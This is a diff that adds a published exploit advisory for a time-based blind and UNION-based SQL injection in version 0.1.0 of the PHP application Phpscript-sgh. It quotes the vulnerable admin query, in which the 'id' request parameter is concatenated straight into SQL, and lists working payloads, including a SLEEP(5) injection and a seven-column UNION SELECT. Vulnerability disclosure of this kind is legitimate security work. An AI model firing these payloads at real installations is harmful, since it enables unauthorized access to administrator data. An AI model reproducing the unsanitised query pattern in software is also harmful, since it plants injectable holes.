@@ -1,0 +1,36 @@
+# Exploit Title: Phpscript-sgh 0.1.0 - Time Based Blind SQL Injection
+# Date: 2020-12-04
+# Exploit Author: KeopssGroup0day,Inc
+# Vendor Homepage: https://github.com/geraked/phpscript-sgh
+# Software Link: https://github.com/geraked/phpscript-sgh
+# Version: 0.1.0
+# Tested on: Kali Linux
+
+------------------------------------------------------------------------------------------------------------------------
+Source code(localhost/admin/admins.php):
+
+if ($_REQUEST['op']=='add') {
+	$id = $username = $password = $conf_password = $firstname = $lastname = 
+$email = $pic = $_SESSION['aapic'] = "";
+	}
+	else {
+		$result	= $conn->query("SELECT * FROM sgh_admins WHERE 
+id=".test_input($_REQUEST['id'])." LIMIT 1");
+		$row	= $result->fetch_assoc();
+		extract($row);
+		$_SESSION['aapic'] = $pic;
+	}
+
+------------------------------------------------------------------------------------------------------------------------
+Parameter: id (GET)
+Type: time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: op=edit&id=1 AND (SELECT 9367 FROM 
+(SELECT(SLEEP(5)))pBEE)&_pjax=#pjax-container
+
+Type: UNION query
+Title: Generic UNION query (NULL) - 7 columns
+Payload: op=edit&id=-5015 UNION ALL SELECT 
+NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b716271,0x536b4e4a775448674c73477175675a4c58476659474f524b535456706e7276474251424a4f67744b,0x717a626b71),NULL-- 
+-&_pjax=#pjax-container
+------------------------------------------------------------------------------------------------------------------------
